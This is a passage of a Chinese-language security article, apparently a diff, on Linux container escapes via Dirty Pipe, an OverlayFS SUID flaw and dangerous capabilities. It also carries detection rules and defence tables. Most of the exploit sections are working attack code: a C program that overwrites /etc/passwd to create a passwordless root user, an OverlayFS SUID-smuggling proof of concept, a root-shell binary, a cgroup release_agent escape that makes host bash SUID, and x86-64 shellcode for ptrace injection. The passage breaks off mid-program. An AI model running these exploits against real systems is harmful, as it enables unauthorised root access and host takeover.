+<p><strong>背景知识</strong>：Linux 通过页缓存加速文件 I/O。同一个文件的所有进程共享同一份页缓存副本，与命名空间无关。这意味着容器内进程修改页缓存，等于修改了宿主机上所有进程看到的文件内容。</p>
+<p><strong>漏洞根因</strong>：在 <code>splice()</code> 系统调用向 pipe 写入数据的路径中，内核未正确清除 <code>pipe_buffer</code> 结构体中的 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位。正常情况下 pipe 写入应该追加在末尾，但由于该标志位残留，写入会"合并"到 splice 进来的那个页——而这个页正是目标文件在页缓存中的页。</p>
+<p>效果：攻击者可以对任意<strong>有读权限</strong>的文件（包括只读挂载的文件）进行任意写入，覆盖其页缓存内容。</p>
+<div class="highlight"><pre><span></span><code>   正常 pipe 写入：追加到 pipe 末尾新页
+   ┌────┬────┬────┬────┐
+   │ p0 │ p1 │ p2 │ p3 │  ← write 在末尾追加
+   └────┴────┴────┴────┘
+
+   Dirty Pipe：splice 注入目标文件页，CAN_MERGE 残留
+   ┌────┬────┬────┬──────────────┐
+   │ p0 │ p1 │ p2 │ 目标文件页!!  │  ← write 覆盖了目标文件页缓存
+   └────┴────┴────┴──────┬───────┘
+                         │ 该页同时映射到目标文件
+                         ▼
+                  文件内容被篡改（绕过 VFS 权限）
+</code></pre></div>
+
+<h3>6 步利用序列（C 代码）</h3>
+<div class="highlight"><pre><span></span><code><span class="cp">#define _GNU_SOURCE</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;fcntl.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/stat.h&gt;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;/etc/passwd&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="c1">// 要写入的内容：在偏移 1 处覆盖，使 root 行密码置空</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;toor::0:0:root:/root:/bin/sh</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// 步骤 1：以只读方式打开目标文件（只需读权限即可！）</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDONLY</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fd</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;open&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 步骤 2：创建一个 pipe</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+<span class="w">    </span><span class="n">pipe</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 步骤 3：填满 pipe（16 个页，让所有 pipe_buffer 的 CAN_MERGE 置位）</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">16</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 步骤 4：排出 1 个字节（让 pipe 头部空出一个页，offset=1）</span>
+<span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 步骤 5：用 splice 把目标文件偏移 1 处的 1 字节&quot;注入&quot;pipe</span>
+<span class="w">    </span><span class="c1">//   关键：这一步让目标文件的页进入 pipe_buffer，</span>
+<span class="w">    </span><span class="c1">//        但 CAN_MERGE 标志位未被清除</span>
+<span class="w">    </span><span class="n">loff_t</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">ssize_t</span><span class="w"> </span><span class="n">nbytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">splice</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">nbytes</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;splice&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 步骤 6：向 pipe 写入数据 —— 由于 CAN_MERGE 残留，</span>
+<span class="w">    </span><span class="c1">//   数据被合并到目标文件页缓存，等于覆盖文件偏移 1 处内容</span>
+<span class="w">    </span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
+
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] 文件页缓存已被覆盖</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>容器逃逸路径</h3>
+<p>容器内的攻击目标通常是宿主机文件系统中存在的 SUID 二进制（如 <code>/bin/su</code>、<code>/usr/bin/passwd</code>），它们通过容器 overlay 挂载仍然映射到同一份页缓存。攻击者覆盖 SUID 二进制的内容为恶意 shellcode，随后宿主机或高权限进程执行它即可获得 root。</p>
+<div class="highlight"><pre><span></span><code>   容器内                          宿主机
+   ┌──────────────────┐           ┌──────────────────────┐
+   │ 覆盖 /bin/passwd │           │                      │
+   │ 页缓存为 shellcode│ ──同一页缓存─►│ /bin/passwd 内容被改 │
+   └──────────────────┘           │                      │
+                                  │ 任意用户执行 su       │
+                                  │ → 运行 shellcode     │
+                                  │ → 宿主 root shell    │
+                                  └──────────────────────┘
+</code></pre></div>
+
+<h3>关键特性</h3>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>无需 capabilities</td>
+<td>只要能读目标文件即可，普通用户权限足矣</td>
+</tr>
+<tr>
+<td>无竞态条件</td>
+<td>同步操作，100% 可靠，非 TOCTOU</td>
+</tr>
+<tr>
+<td>readOnly 挂载无效</td>
+<td>只读挂载只影响 VFS 写路径，页缓存绕过 VFS</td>
+</tr>
+<tr>
+<td>重启失效</td>
+<td>页缓存是内存态，重启后恢复磁盘原始内容</td>
+</tr>
+<tr>
+<td>影响内核</td>
+<td>5.8 ≤ 内核 &lt; 5.16.11 / 5.15.25 / 5.10.102</td>
+</tr>
+</tbody>
+</table>
+<h3>检测</h3>
+<p>Datadog CWS（Cloud Workload Security）规则示例：</p>
+<div class="highlight"><pre><span></span><code><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Dirty Pipe File Overwrite Attempt</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测 splice 后立即 write 的模式，疑似 CVE-2022-0847</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">syscall.splice and</span>
+<span class="w">    </span><span class="no">(syscall.write within 1s) and</span>
+<span class="w">    </span><span class="no">proc.container.id != &quot;&quot;</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Possible Dirty Pipe exploitation</span>
+<span class="w">    </span><span class="no">(container=%container.id proc=%proc.cmdline</span>
+<span class="w">    </span><span class="no">file=%syscall.splice.args.fd_out)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CRITICAL</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">cve-2022-0847</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">container_escape</span><span class="p p-Indicator">]</span>
+</code></pre></div>
+
+<h3>防御</h3>
+<table>
+<thead>
+<tr>
+<th>防御措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>升级内核</td>
+<td>升级到 ≥5.16.11 / ≥5.15.25 / ≥5.10.102</td>
+</tr>
+<tr>
+<td>seccomp 阻止 splice/tee/vmsplice</td>
+<td>deny 这些系统调用可阻断利用路径</td>
+</tr>
+<tr>
+<td>Rootless 容器</td>
+<td>rootless 模式下容器进程映射到非 root uid，限制可写目标</td>
+</tr>
+<tr>
+<td>最小文件权限</td>
+<td>减少容器可读的 SUID 二进制</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>技术五：OverlayFS 漏洞利用（CVE-2023-0386）</h2>
+<h3>原理</h3>
+<p>OverlayFS 是容器镜像的默认存储驱动，通过"叠加" lowerdir（只读镜像层）和 upperdir（可写层）实现分层文件系统。当容器对 lower 层文件进行写操作时，OverlayFS 会触发 <strong>copy-up</strong>：将文件从 lower 复制到 upper。</p>
+<p>CVE-2023-0386 的根因在于：copy-up 操作在复制文件时<strong>未检查文件的 SUID 位和 UID/GID 映射</strong>。这导致一个位于 lower 层（如 FUSE 挂载）的 SUID-root 二进制，被 copy-up 到 upper 层后，依然保留 SUID 位，且其属主被映射为宿主机真实 root。</p>
+<p>攻击者借此"走私"一个 SUID root 二进制到宿主机文件系统，随后在宿主机上执行它即可提权。</p>
+<div class="highlight"><pre><span></span><code><span class="w">   </span>攻击链：
+<span class="w">   </span>┌──────────────┐<span class="w">   </span><span class="mi">1</span>.<span class="w"> </span><span class="nv">FUSE</span><span class="w"> </span>挂载含<span class="w"> </span><span class="nv">SUID</span><span class="o">-</span><span class="nv">root</span><span class="w"> </span>二进制（<span class="nv">lower</span>）
+<span class="w">   </span>│<span class="w">  </span><span class="nv">FUSE</span><span class="w"> </span>源<span class="w">     </span>│<span class="w"> </span>─────────────────────────────────────────┐
+<span class="w">   </span>│<span class="w">  </span><span class="nv">suid</span><span class="w"> </span><span class="nv">x</span>.<span class="nv">c</span><span class="w">    </span>│<span class="w">                                          </span>│
+<span class="w">   </span>└──────────────┘<span class="w">                                          </span>▼
+<span class="w">                      </span><span class="mi">2</span>.<span class="w"> </span><span class="nv">unshare</span><span class="w"> </span><span class="nv">user</span><span class="o">+</span><span class="nv">mount</span><span class="w"> </span><span class="nv">NS</span><span class="w">           </span>┌────────┐
+<span class="w">                      </span><span class="mi">3</span>.<span class="w"> </span><span class="nv">mount</span><span class="w"> </span><span class="nv">overlay</span><span class="ss">(</span><span class="nv">lower</span><span class="o">=</span><span class="nv">FUSE</span><span class="ss">)</span><span class="w">       </span>│<span class="w"> </span><span class="nv">lower</span><span class="w">  </span>│<span class="w"> </span><span class="nv">SUID</span><span class="w"> </span><span class="nv">root</span>
+<span class="w">                      </span><span class="mi">4</span>.<span class="w"> </span><span class="nv">touch</span><span class="w"> </span>触发<span class="w"> </span><span class="nv">copy</span><span class="o">-</span><span class="nv">up</span><span class="w">              </span>└───┬────┘
+<span class="w">                                                          </span><span class="nv">copy</span><span class="o">-</span><span class="nv">up</span>（不检查映射）
+<span class="w">                                                              </span>▼
+<span class="w">                                                          </span>┌────────┐
+<span class="w">                                                          </span>│<span class="w"> </span><span class="nv">upper</span><span class="w">  </span>│<span class="w"> </span><span class="nv">SUID</span><span class="w"> </span><span class="nv">root</span>
+<span class="w">                                                          </span>│<span class="w">  </span>保留<span class="w">  </span>│<span class="w"> </span>→<span class="w"> </span>宿主真实<span class="w"> </span><span class="nv">root</span>
+<span class="w">                                                          </span>└────────┘
+<span class="w">                      </span><span class="mi">5</span>.<span class="w"> </span><span class="k">exit</span><span class="w"> </span><span class="nv">NS</span><span class="w"> </span>→<span class="w"> </span>文件留在宿主机可见的<span class="w"> </span><span class="nv">upper</span>
+<span class="w">                      </span><span class="mi">6</span>.<span class="w"> </span>宿主机执行该<span class="w"> </span><span class="nv">SUID</span><span class="w"> </span>二进制<span class="w"> </span>→<span class="w"> </span><span class="nv">root</span>
+</code></pre></div>
+
+<h3>补丁分析</h3>
+<p>漏洞补丁在 <code>ovl_copy_up_one()</code> 中增加了 <code>kuid_has_mapping()</code> 检查：copy-up 时验证源文件的 <code>kuid/kgid</code> 是否在目标 mount 的 user namespace 中有映射。若无映射（如 FUSE 中的全局 root uid），则拒绝 copy-up 或剥离 SUID 位。</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 补丁核心逻辑（简化）</span>
+<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">ovl_copy_up_one</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">dentry</span><span class="w"> </span><span class="o">*</span><span class="n">parent</span><span class="p">,</span><span class="w"> </span><span class="p">...)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="w">    </span><span class="c1">// 新增：检查 UID/GID 映射</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">kuid_has_mapping</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mnt</span><span class="o">-&gt;</span><span class="n">mnt_sb</span><span class="o">-&gt;</span><span class="n">s_user_ns</span><span class="p">,</span><span class="w"> </span><span class="n">stat</span><span class="p">.</span><span class="n">uid</span><span class="p">)</span><span class="w"> </span><span class="o">||</span>
+<span class="w">        </span><span class="o">!</span><span class="n">kgid_has_mapping</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mnt</span><span class="o">-&gt;</span><span class="n">mnt_sb</span><span class="o">-&gt;</span><span class="n">s_user_ns</span><span class="p">,</span><span class="w"> </span><span class="n">stat</span><span class="p">.</span><span class="n">gid</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 拒绝保留 SUID/SGID</span>
+<span class="w">        </span><span class="n">stat</span><span class="p">.</span><span class="n">mode</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="o">~</span><span class="p">(</span><span class="n">S_ISUID</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">S_ISGID</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>PoC</h3>
+<p><strong>步骤 1：FUSE 伪装 SUID 二进制</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1">// fuse_suid.c —— FUSE 文件系统返回一个 SUID-root 二进制</span>
+<span class="cp">#define FUSE_USE_VERSION 31</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;fuse3/fuse.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/stat.h&gt;</span>
+
+<span class="k">static</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">suid_binary</span><span class="w"> </span><span class="o">=</span>
+<span class="w">    </span><span class="s">&quot;</span><span class="se">\x7f\x45\x4c\x46</span><span class="s">&quot;</span><span class="w"> </span><span class="cm">/* ELF magic，此处省略完整 shellcode */</span><span class="p">;</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">myfs_getattr</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">path</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">stat</span><span class="w"> </span><span class="o">*</span><span class="n">st</span><span class="p">,</span><span class="w"> </span><span class="p">...)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">path</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;/suid&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">st</span><span class="o">-&gt;</span><span class="n">st_mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">S_IFREG</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mo">04755</span><span class="p">;</span><span class="w">  </span><span class="c1">// SUID + 0755</span>
+<span class="w">        </span><span class="n">st</span><span class="o">-&gt;</span><span class="n">st_uid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">                 </span><span class="c1">// root</span>
+<span class="w">        </span><span class="n">st</span><span class="o">-&gt;</span><span class="n">st_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">suid_binary</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c1">// ... fuse 操作实现省略</span>
+</code></pre></div>
+
+<p><strong>步骤 2：触发 copy-up 并执行</strong></p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># CVE-2023-0386 OverlayFS SUID 走私 PoC</span>
+
+<span class="c1"># 1. 启动 FUSE 文件系统，提供 SUID-root 二进制</span>
+./fuse_suid<span class="w"> </span>/tmp/fuse_lower<span class="w"> </span><span class="p">&amp;</span>
+
+<span class="c1"># 2. 在 user+mount namespace 中挂载 overlay</span>
+unshare<span class="w"> </span>-UrM<span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;</span>
+<span class="s1">  mkdir /tmp/overlay/{upper,work,mnt}</span>
+<span class="s1">  mount -t overlay overlay \</span>
+<span class="s1">    -o lowerdir=/tmp/fuse_lower,upperdir=/tmp/overlay/upper,workdir=/tmp/overlay/work \</span>
+<span class="s1">    /tmp/overlay/mnt</span>
+
+<span class="s1">  # 3. touch 触发 copy-up（FUSE 的 SUID 二进制被复制到 upper）</span>
+<span class="s1">  touch /tmp/overlay/mnt/suid</span>
+<span class="s1">&#39;</span>
+
+<span class="c1"># 4. 退出 namespace 后，upper 中的 suid 仍为 SUID-root</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/tmp/overlay/upper/suid
+<span class="c1"># -rwsr-xr-x 1 root root ... /tmp/overlay/upper/suid</span>
+
+<span class="c1"># 5. 在宿主机上以普通用户执行 → 提权到 root</span>
+/tmp/overlay/upper/suid
+</code></pre></div>
+
+<p><strong>SUID 提权二进制 C 代码：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1">// suid_root.c —— 编译后设置 SUID 位</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// SUID 程序以文件属主身份执行 → root</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;setuid&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] now root: uid=%d euid=%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">getuid</span><span class="p">(),</span><span class="w"> </span><span class="n">geteuid</span><span class="p">());</span>
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>检测</h3>
+<p>auditd 规则，监控 overlay 文件的 SUID 位创建：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># /etc/audit/rules.d/overlay.rules</span>
+-a<span class="w"> </span>always,exit<span class="w"> </span>-F<span class="w"> </span><span class="nv">arch</span><span class="o">=</span>b64<span class="w"> </span>-S<span class="w"> </span>chmod,fchmod,fchmodat<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="nv">dir</span><span class="o">=</span>/var/lib/docker<span class="w"> </span>-F<span class="w"> </span>a2<span class="p">&amp;</span><span class="m">04000</span><span class="w"> </span>-k<span class="w"> </span>overlay_suid_set
+-a<span class="w"> </span>always,exit<span class="w"> </span>-F<span class="w"> </span><span class="nv">arch</span><span class="o">=</span>b64<span class="w"> </span>-S<span class="w"> </span>mount<span class="w"> </span>-k<span class="w"> </span>overlay_mount
+</code></pre></div>
+
+<h3>防御</h3>
+<table>
+<thead>
+<tr>
+<th>防御措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>升级内核至 6.2+</td>
+<td>合入 kuid_has_mapping 检查</td>
+</tr>
+<tr>
+<td>禁用 user namespace</td>
+<td><code>user.max_user_namespaces=0</code>，阻断 unshare 挂载 overlay</td>
+</tr>
+<tr>
+<td>限制 FUSE</td>
+<td>seccomp/AppArmor 禁止容器内 FUSE 挂载</td>
+</tr>
+<tr>
+<td>监控 SUID 创建</td>
+<td>auditd 监控 overlay 目录中 SUID 位变更</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>技术六：内核 Capabilities 滥用</h2>
+<h3>原理</h3>
+<p>Linux capabilities 将传统 root 权限拆分为数十个细粒度权限位。容器通常以 root 运行，但通过"丢弃"部分 capabilities 来降权。然而，<strong>部分单个 capability 本身就足以等同宿主机 root</strong>——一旦容器保留了这些危险 capability，逃逸门槛骤降。</p>
+<p>capabilities 是内核级概念，<strong>不受容器命名空间约束</strong>：拥有 <code>CAP_SYS_ADMIN</code> 的容器进程对内核而言就是"在当前 userns 内的特权进程"。</p>
+<h3>最危险 capabilities</h3>
+<table>
+<thead>
+<tr>
+<th>Capability</th>
+<th>危险能力</th>
+<th>逃逸利用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CAP_SYS_ADMIN</td>
+<td>"新 root"，可挂载、改 cgroup、ioctrl</td>
+<td>几乎所有上述技术的前置条件</td>
+</tr>
+<tr>
+<td>CAP_SYS_MODULE</td>
+<td>加载/卸载内核模块</td>
+<td><code>insmod</code> 恶意 .ko，内核态任意代码</td>
+</tr>
+<tr>
+<td>CAP_SYS_PTRACE</td>
+<td>ptrace 任意进程</td>
+<td>进程注入、读取宿主进程内存</td>
+</tr>
+<tr>
+<td>CAP_SYS_RAWIO</td>
+<td>原始 I/O 访问</td>
+<td>直接读写 <code>/dev/mem</code>、磁盘设备</td>
+</tr>
+<tr>
+<td>CAP_DAC_READ_SEARCH</td>
+<td>绕过文件读权限检查</td>
+<td>读取宿主机任意文件</td>
+</tr>
+<tr>
+<td>CAP_NET_ADMIN</td>
+<td>网络配置</td>
+<td>修改路由、创建网卡、ARP 欺骗</td>
+</tr>
+</tbody>
+</table>
+<h3>PoC：三种典型滥用</h3>
+<p><strong>1. CAP_SYS_ADMIN → cgroup 逃逸</strong></p>
+<p>即技术一的后半段（无需 unshare，直接有权限）：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 容器以 --cap-add SYS_ADMIN 启动</span>
+mkdir<span class="w"> </span>/tmp/cgrp<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>cgroup<span class="w"> </span>-o<span class="w"> </span>rdma<span class="w"> </span>cgroup<span class="w"> </span>/tmp/cgrp
+mkdir<span class="w"> </span>/tmp/cgrp/x<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/cgrp/x/notify_on_release
+<span class="nv">host_path</span><span class="o">=</span><span class="k">$(</span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span><span class="w"> </span>/etc/mtab<span class="k">)</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$host_path</span><span class="s2">/cmd&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/cgrp/x/release_agent
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;#!/bin/sh\nchmod 4777 /bin/bash&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/cmd
+sh<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs &amp;&amp; sleep 1&quot;</span>
+</code></pre></div>
+
+<p><strong>2. CAP_SYS_PTRACE → 进程注入（C 代码）</strong></p>
+<p>需配合 <code>hostPID</code> 看到宿主机进程：</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/ptrace.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/wait.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/user.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+
+<span class="c1">// 经典 shellcode：execve(&quot;/bin/sh&quot;)</span>
+<span class="kt">char</span><span class="w"> </span><span class="n">shellcode</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span>
+<span class="w">    </span><span class="s">&quot;</span><span class="se">\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0</span><span class="s">&quot;</span>
+<span class="w">    </span><span class="s">&quot;</span><span class="se">\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53</span><span class="s">&quot;</span>
+<span class="w">    </span><span class="s">&quot;</span><span class="se">\x48\x89\xe7\xb0\x3b\x0f\x05</span><span class="s">&quot;</span><span class="p">;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
